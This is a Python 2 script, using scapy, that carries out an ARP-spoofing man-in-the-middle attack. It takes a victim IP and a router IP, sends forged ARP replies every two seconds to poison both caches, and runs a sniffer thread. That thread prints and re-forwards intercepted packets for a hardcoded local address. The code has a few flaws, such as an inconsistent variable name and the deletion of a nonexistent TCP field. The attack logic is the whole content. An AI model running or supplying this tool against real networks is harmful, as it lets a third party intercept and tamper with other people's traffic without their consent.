import subprocess
import os
import scapy.all
import time
import sys
import threading

victime_ip='0'

def select_victim():
    victim_ip=raw_input('Input victim IP')
    router_ip=raw_input('Input router IP')
    return (victim_ip, router_ip)

def getMac(host):
    a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
    a=a.stdout.read().split('\n')[:-1]
    for i in a:
        tmp=i.split(' ')
        if host in tmp[1]:
            return tmp[3]

def attack(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

def recover(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)

def pr(x):
    try:
        global victime_ip
        print victime_ip
        if x['IP'].dst == '192.168.6.122' or x['IP'].src == '192.168.6.122':
            del x['IP'].chksum
            if x.haslayer(scapy.all.UDP):
                del x['UDP'].chksum
                del x['UDP'].len

            if x.haslayer(scapy.all.TCP):
                del x['TCP'].chksum
                del x['TCP'].len

            x.show()
            #if x['IP'].dst == '192.168.0.2':
            #    x['Ethernet'].dst=getMac('192.168.0.2')
            #    x.show();
            scapy.all.sendp(x, iface='en0')
    except Exception, err:
        print err
        pass

def sniffing():
    scapy.all.sniff(prn=pr)

def main():
    #if os.geteuid() != 0:
    #    sys.exit("[!] Please run as root")
    IP=select_victim()
    global victim_ip
    victim_ip=IP[0]
    router_ip=IP[1]

    if getMac(router_ip) == None:
        print 'We can not find router mac address'
        return

    if getMac(victim_ip) == None:
        print 'we can not find victim mac address'
        return

    t=threading.Thread(target=sniffing)
    t.start()


    try:
        while True:
            print 'a'
            attack(victim_ip, router_ip)
            time.sleep(2)
    except Exception, err:
        print err
        recover(victim_ip, router_ip)
        t.join(10)
        exit()



if __name__ == '__main__':
    main()

